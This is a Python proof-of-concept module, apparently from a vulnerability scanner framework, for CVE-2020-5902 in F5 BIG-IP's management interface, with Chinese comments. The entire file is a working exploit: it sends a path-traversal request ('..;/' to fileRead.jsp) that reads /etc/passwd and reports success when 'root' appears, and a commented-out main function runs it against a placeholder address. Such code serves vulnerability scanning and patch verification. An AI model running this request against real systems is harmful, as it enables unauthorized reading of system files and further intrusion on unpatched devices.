from config import Default
from core.requester import requests
from core.requester import mount2dispatcher
from hyperion_types import POC
from hyperion_types.target import Target
from typing import *


class CVE20205902(POC):
    # POC测试主体
    def execute(self) -> Tuple[bool]:
        res = yield requests(
            f'{self.target.url}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
            timeout=1, ssl=False)
        result: bytes = res['read']
        success = result.find(b'root')
        yield success != -1

    @staticmethod
    def filter(target: Target):
        return target.cms == "BIG5"

# 为了确保poc能直接运行，编写main函数，main函数的具体含义在modules中给出
# 逻辑与POC编写无关，此处可以不做理解
# if __name__ == '__main__':
#     for i in range(1):
#         target = Target('https://xxx.xxx.xxx.xxx')
#         poc = CVE20205902(target, Default)
#         mount2dispatcher(poc, callback=lambda x, y: print(x, y))
